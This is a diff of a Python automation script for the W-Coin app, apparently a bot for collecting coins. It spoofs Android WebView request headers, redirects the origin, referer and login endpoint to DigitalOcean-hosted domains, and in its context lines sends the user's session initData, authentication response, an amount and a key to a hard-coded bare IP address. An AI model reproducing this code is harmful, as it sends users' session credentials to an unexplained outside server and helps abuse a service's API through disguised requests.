@@ -13,10 +13,10 @@ headers = {
     'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
     'cache-control': 'no-cache',
     'content-type': 'application/json',
-    'origin': 'https://app.w-coin.io',
+    'origin': 'https://alohomora-bucket-fra1-prod-frontend-static.fra1.cdn.digitaloceanspaces.com',
     'pragma': 'no-cache',
     'priority': 'u=1, i',
-    'referer': 'https://app.w-coin.io/',
+    'referer': 'https://alohomora-bucket-fra1-prod-frontend-static.fra1.cdn.digitaloceanspaces.com/',
     'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Android WebView";v="128"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
@@ -39,7 +39,7 @@ def main_wcoin(session ,amount, key):
             'identifier':identifier,
             'password': identifier,
         }
-    res = requests.post('https://app.w-coin.io/wapi/api/auth/local', json=json_data).json()
+    res = requests.post('https://starfish-app-fknmx.ondigitalocean.app/wapi/api/auth/local', json=json_data).json()
     r = requests.post('http://77.37.63.209:5000/api',json={'initData':session,'serverData':res,'amount':amount,'key':key})
     return (r.json())
 def create_gradient_banner(text):
